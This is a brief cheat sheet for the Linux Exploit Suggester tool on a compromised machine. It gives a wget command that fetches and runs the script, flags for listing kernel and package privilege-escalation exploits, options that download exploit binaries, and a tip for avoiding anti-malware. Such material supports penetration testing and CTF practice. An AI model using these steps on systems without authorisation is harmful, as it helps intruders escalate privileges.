# Linux Exploit Suggester

Run the script and it will provide exploit suggestions of the compromised machine.

```
$ wget --no-hsts https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh

$ ./linux-exploit-suggester.sh
```

Provide full info about the exploits.

```
$ ./linux-exploit-suggester.sh -f
```

Display short information about the exploits.

```
$ ./linux-exploit-suggester.sh -g
```

Provide the kernel version without needing to transfer the script if anti-malware is installed.

```
$ ./linux-exploit-suggester.sh -k <kernel_version>
```

Run the `uname -a` (or read the contents in `/proc/version`) and it will provide kernel exploit suggestion results.

```
$ ./linux-exploit-suggester.sh -u <uname_output_string>
```

Look for outdated Linux packages to provide a list.

```
$ dpkg -l > pkgs-list.txt

$ rpm -qa > pkgs-list.txt

$ ./linux-exploit-suggester.sh -p pkgs-list.txt
```

Automatically download the source binaries that matches the version number.

```
$ ./linux-exploit-suggester.sh -s
```

Automatically download the exploit binaries that matches the rest of them.

```
$ ./linux-exploit-suggester.sh -b
```
